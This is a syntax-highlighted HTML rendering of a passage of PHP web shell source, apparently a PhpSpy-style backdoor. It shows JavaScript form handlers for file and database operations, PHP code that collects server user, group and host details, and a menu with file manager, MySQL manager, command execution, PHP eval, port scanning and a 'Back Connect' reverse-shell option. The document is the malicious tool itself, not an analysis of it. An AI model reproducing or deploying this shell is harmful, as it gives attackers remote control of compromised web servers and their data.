<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">m</span> &amp;&amp; !<span style="color: #c5c8c6; background-color: #1d1f21;">confirm(</span><span style="color: #cc6666; font-weight: bold;">m</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'filelist'</span>).<span style="color: #cc6666; font-weight: bold;">doing</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">doing</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">thefile</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'filelist'</span>).<span style="color: #cc6666; font-weight: bold;">thefile</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">thefile</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'filelist'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">createfile</span>(<span style="color: #cc6666; font-weight: bold;">nowpath</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">filename</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">filename</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">prompt(</span><span style="color: #8abeb7;">'Please input the file name:'</span>, <span style="color: #8abeb7;">''</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #cc6666; font-weight: bold;">filename</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">opfile(</span><span style="color: #8abeb7;">'editfile'</span>,<span style="color: #cc6666; font-weight: bold;">nowpath</span> + <span style="color: #cc6666; font-weight: bold;">filename</span>,<span style="color: #cc6666; font-weight: bold;">nowpath</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">opfile</span>(<span style="color: #cc6666; font-weight: bold;">action</span>,<span style="color: #cc6666; font-weight: bold;">opfile</span>,<span style="color: #cc6666; font-weight: bold;">dir</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileopform'</span>).<span style="color: #cc6666; font-weight: bold;">action</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">action</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileopform'</span>).<span style="color: #cc6666; font-weight: bold;">opfile</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">opfile</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileopform'</span>).<span style="color: #cc6666; font-weight: bold;">dir</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">dir</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileopform'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">godir</span>(<span style="color: #cc6666; font-weight: bold;">dir</span>,<span style="color: #cc6666; font-weight: bold;">view_writable</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">view_writable</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'godir'</span>).<span style="color: #cc6666; font-weight: bold;">view_writable</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">view_writable</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'godir'</span>).<span style="color: #cc6666; font-weight: bold;">dir</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">dir</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'godir'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getsize</span>(<span style="color: #cc6666; font-weight: bold;">getdir</span>,<span style="color: #cc6666; font-weight: bold;">dir</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'getsize'</span>).<span style="color: #cc6666; font-weight: bold;">getdir</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">getdir</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'getsize'</span>).<span style="color: #cc6666; font-weight: bold;">dir</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">dir</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'getsize'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">editrecord</span>(<span style="color: #cc6666; font-weight: bold;">action</span>, <span style="color: #cc6666; font-weight: bold;">base64</span>, <span style="color: #cc6666; font-weight: bold;">tablename</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">action</span> == <span style="color: #8abeb7;">'del'</span>) {<span style="color: #cc6666; background-color: #373b41;">      </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #c5c8c6; background-color: #1d1f21;">confirm(</span><span style="color: #8abeb7;">'Is or isn\'t deletion record?'</span>)) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'recordlist'</span>).<span style="color: #cc6666; font-weight: bold;">doing</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">action</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'recordlist'</span>).<span style="color: #cc6666; font-weight: bold;">base64</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">base64</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'recordlist'</span>).<span style="color: #cc6666; font-weight: bold;">tablename</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">tablename</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'recordlist'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">moddbname</span>(<span style="color: #cc6666; font-weight: bold;">dbname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!<span style="color: #cc6666; font-weight: bold;">dbname</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'setdbname'</span>).<span style="color: #cc6666; font-weight: bold;">dbname</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">dbname</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'setdbname'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">settable</span>(<span style="color: #cc6666; font-weight: bold;">tablename</span>,<span style="color: #cc6666; font-weight: bold;">doing</span>,<span style="color: #cc6666; font-weight: bold;">page</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!<span style="color: #cc6666; font-weight: bold;">tablename</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">doing</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'settable'</span>).<span style="color: #cc6666; font-weight: bold;">doing</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">doing</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">page</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'settable'</span>).<span style="color: #cc6666; font-weight: bold;">page</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">page</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'settable'</span>).<span style="color: #cc6666; font-weight: bold;">tablename</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">tablename</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'settable'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">s</span>(<span style="color: #cc6666; font-weight: bold;">action</span>,<span style="color: #cc6666; font-weight: bold;">nowpath</span>,<span style="color: #cc6666; font-weight: bold;">p1</span>,<span style="color: #cc6666; font-weight: bold;">p2</span>,<span style="color: #cc6666; font-weight: bold;">p3</span>,<span style="color: #cc6666; font-weight: bold;">p4</span>,<span style="color: #cc6666; font-weight: bold;">p5</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">action</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">action</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">action</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">nowpath</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">nowpath</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">nowpath</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">p1</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">p1</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">p1</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">p2</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">p2</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">p2</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">p3</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">p3</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">p3</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">p4</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">p4</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">p4</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">p5</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #cc6666; font-weight: bold;">p4</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">p5</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">g</span>(<span style="color: #cc6666; font-weight: bold;">action</span>,<span style="color: #cc6666; font-weight: bold;">nowpath</span>,<span style="color: #cc6666; font-weight: bold;">p1</span>,<span style="color: #cc6666; font-weight: bold;">p2</span>,<span style="color: #cc6666; font-weight: bold;">p3</span>,<span style="color: #cc6666; font-weight: bold;">p4</span>,<span style="color: #cc6666; font-weight: bold;">p5</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!<span style="color: #cc6666; font-weight: bold;">action</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">s(</span><span style="color: #cc6666; font-weight: bold;">action</span>,<span style="color: #cc6666; font-weight: bold;">nowpath</span>,<span style="color: #cc6666; font-weight: bold;">p1</span>,<span style="color: #cc6666; font-weight: bold;">p2</span>,<span style="color: #cc6666; font-weight: bold;">p3</span>,<span style="color: #cc6666; font-weight: bold;">p4</span>,<span style="color: #cc6666; font-weight: bold;">p5</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'opform'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #81a2be;">&lt;/script&gt;</span>
<span style="color: #81a2be;">&lt;/head&gt;</span>
<span style="color: #81a2be;">&lt;body</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"margin:0;table-layout:fixed; word-break:break-all"</span><span style="color: #81a2be;">&gt;</span>
<span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=<span style="color: #81a2be;">&gt;</span><span style="color: #8abeb7;">'opform'</span>));
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>, $<span style="color: #f0c674;">action</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'nowpath'</span>, $<span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'p1'</span>, $<span style="color: #f0c674;">p1</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'p2'</span>, $<span style="color: #f0c674;">p2</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'p3'</span>, $<span style="color: #f0c674;">p3</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'p4'</span>, $<span style="color: #f0c674;">p4</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'p5'</span>, $<span style="color: #f0c674;">p5</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="color: #b5bd68;">if</span>(!<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'posix_getegid'</span>)) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">user</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">get_current_user(</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">uid</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">getmyuid(</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">gid</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">getmygid(</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">group</span> = <span style="color: #8abeb7;">"?"</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">uid</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">posix_getpwuid(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">posix_geteuid(</span>));
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">gid</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">posix_getgrgid(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">posix_getegid(</span>));
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">user</span> = $<span style="color: #f0c674;">uid</span>[<span style="color: #8abeb7;">'name'</span>];
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">uid</span> = $<span style="color: #f0c674;">uid</span>[<span style="color: #8abeb7;">'uid'</span>];
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">group</span> = $<span style="color: #f0c674;">gid</span>[<span style="color: #8abeb7;">'name'</span>];
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">gid</span> = $<span style="color: #f0c674;">gid</span>[<span style="color: #8abeb7;">'gid'</span>];
}

<span style="color: #b294bb;">?&gt;</span>
<span style="color: #81a2be;">&lt;table</span> <span style="color: #81a2be;">width=</span><span style="color: #8abeb7;">"100%"</span> <span style="color: #81a2be;">border=</span><span style="color: #8abeb7;">"0"</span> <span style="color: #81a2be;">cellpadding=</span><span style="color: #8abeb7;">"0"</span> <span style="color: #81a2be;">cellspacing=</span><span style="color: #8abeb7;">"0"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;tr</span> <span style="color: #81a2be;">class=</span><span style="color: #8abeb7;">"head"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td&gt;&lt;span</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"float:right;"</span><span style="color: #81a2be;">&gt;</span><span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">echo</span> @<span style="color: #c5c8c6; background-color: #1d1f21;">php_uname(</span>);<span style="color: #b294bb;">?&gt;</span> / <span style="color: #cc6666; font-weight: bold;">User</span>:<span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">e</span><span style="color: #b5bd68; text-decoration: underline;">cho</span><span style="text-decoration: underline;"> $</span><span style="color: #f0c674; text-decoration: underline;">uid</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">user</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' ) / Group: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">gid</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">group</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' )'</span><span style="text-decoration: underline;">;</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="color: #81a2be; text-decoration: underline;">&lt;/span&gt;</span><span style="color: #b294bb; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #81a2be; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'HTTP_HOST'</span><span style="text-decoration: underline;">];</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #b294bb; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">gethostbyname(</span><span style="text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'SERVER_NAME'</span><span style="text-decoration: underline;">]);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #81a2be; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/tr&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;tr</span> <span style="color: #81a2be;">class=</span><span style="color: #8abeb7;">"alt1"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;span</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"float:right;"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">PHP</span> <span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">echo</span> <span style="color: #81a2be;">PHP_VERSION</span>;<span style="color: #b294bb;">?&gt;</span> / <span style="color: #cc6666; font-weight: bold;">Safe</span> <span style="color: #cc6666; font-weight: bold;">Mode</span><span style="text-decoration: underline;">:</span><span style="color: #b294bb; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">getcfg(</span><span style="color: #8abeb7; text-decoration: underline;">'safe_mode'</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="color: #81a2be; text-decoration: underline;">&lt;/span&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('logout');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Logout</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('file');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">File</span> <span style="color: #cc6666; font-weight: bold;">Manager</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('mysqladmin');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">MYSQL</span> <span style="color: #cc6666; font-weight: bold;">Manager</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('sqlfile');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">MySQL</span> <span style="color: #cc6666; font-weight: bold;">Upload</span> &amp;<span style="color: #cc6666; font-weight: bold;">amp</span>; <span style="color: #cc6666; font-weight: bold;">Download</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41; text-decoration: underline;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('shell');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Execute</span> <span style="color: #cc6666; font-weight: bold;">Command</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('phpenv');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">PHP</span> <span style="color: #cc6666; font-weight: bold;">Variable</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('portscan');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Port</span> <span style="color: #cc6666; font-weight: bold;">Scan</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('secinfo');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Security</span> <span style="color: #cc6666; font-weight: bold;">information</span><span style="color: #81a2be;">&lt;/a&gt;</span> |<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('eval');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Eval</span> <span style="color: #cc6666; font-weight: bold;">PHP</span> <span style="color: #cc6666; font-weight: bold;">Code</span><span style="color: #81a2be;">&lt;/a&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">if</span> (!<span style="color: #cc6666; font-weight: bold;">IS_WIN</span>) {<span style="color: #b294bb;">?&gt;</span> | <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"javascript:g('backconnect');"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Back</span><span style="text-decoration: underline;"> </span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">Connect</span><span style="color: #81a2be; text-decoration: underline;">&lt;/a&gt;</span><span style="color: #b294bb; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> }</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/tr&gt;</span>
<span style="color: #81a2be;">&lt;/table&gt;</span>
<span style="color: #81a2be;">&lt;table</span> <span style="color: #81a2be;">width=</span><span style="color: #8abeb7;">"100%"</span> <span style="color: #81a2be;">border=</span><span style="color: #8abeb7;">"0"</span> <span style="color: #81a2be;">cellpadding=</span><span style="color: #8abeb7;">"15"</span> <span style="color: #81a2be;">cellspacing=</span><span style="color: #8abeb7;">"0"</span><span style="color: #81a2be;">&gt;&lt;tr&gt;&lt;td&gt;</span>
